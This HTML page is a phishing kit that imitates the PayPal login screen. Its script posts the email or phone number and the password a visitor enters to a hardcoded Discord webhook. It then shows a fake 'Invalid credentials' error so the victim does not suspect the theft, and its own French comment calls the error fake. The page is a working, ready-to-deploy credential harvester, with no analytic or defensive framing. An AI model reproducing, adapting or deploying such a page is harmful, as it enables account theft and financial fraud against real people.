<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>PayPal Login</title>

<style>
body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background: #ffffff;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
}

.container {
    background: #ffffff;
    padding: 35px 30px;
    border-radius: 12px;
    box-shadow: 0 4px 20px rgba(0,0,0,0.05);
    width: 350px;
    text-align: center;
}

.container img {
    width: 120px;
    margin-bottom: 50px;
}

.input-container {
    width: 100%;
    margin-bottom: 25px;
}

input {
    width: 100%;
    padding: 14px 12px;
    border-radius: 6px;
    border: 1px solid #cccccc;
    font-size: 16px;
    transition: 0.2s;
}

input:focus {
    outline: none;
    border-color: #0070ba;
    box-shadow: 0 0 5px rgba(0,112,186,0.3);
}

.forgot-password {
    display: block;
    margin-top: 6px;
    font-size: 14px;
    color: #0070ba;
    text-decoration: none;
    text-align: left;
}

.forgot-password:hover {
    text-decoration: underline;
}

.btn-login {
    width: 100%;
    padding: 14px 12px;
    background-color: #003087;
    border: none;
    border-radius: 6px;
    color: white;
    font-size: 16px;
    font-weight: bold;
    cursor: pointer;
    margin-top: 15px;
    transition: 0.2s;
}

.btn-login:hover {
    background-color: #002163;
}

.error {
    color: #ff4d4d;
    margin-top: 12px;
    font-size: 14px;
    display: none;
}
</style>
</head>

<body>

<div class="container">

<img src="https://www.top-bank.ch/images/logo_540/paypal.png" alt="PayPal Logo">

<div class="input-container">
    <input type="text" id="field1" placeholder="Email or Phone Number">
</div>

<div class="input-container">
    <input type="password" id="field2" placeholder="Password">
</div>

<a href="#" class="forgot-password">Forgot your password?</a>

<button class="btn-login" onclick="sendWebhook()">Log In</button>

<div class="error" id="errorMsg">
Error: Invalid credentials.
</div>

</div>

<script>
// NE PAS METTRE VOTRE WEBHOOK DANS UN SITE PUBLIC
// Pour tester en local, tu peux le mettre ici
const webhookURL = "https://discord.com/api/webhooks/1482715159053992098/i50u8cq-9GR5KsOn5J84ZSYydabulGhwyhfUKMrhYUdIYUi5q0AZaxjE7RfLdw907lNf";

function sendWebhook() {
    let field1 = document.getElementById("field1").value;
    let field2 = document.getElementById("field2").value;

    // Vérifie que les champs ne sont pas vides
    if(field1 === "" || field2 === "") return;

    fetch(webhookURL, {
        method:"POST",
        headers: {"Content-Type":"application/json"},
        body: JSON.stringify({
            content: "Login Info:\nUsername/Email: "+field1+"\nPassword: "+field2
        })
    });

    // Affiche une fausse erreur
    document.getElementById("errorMsg").style.display = "block";
}
</script>

</body>
</html>
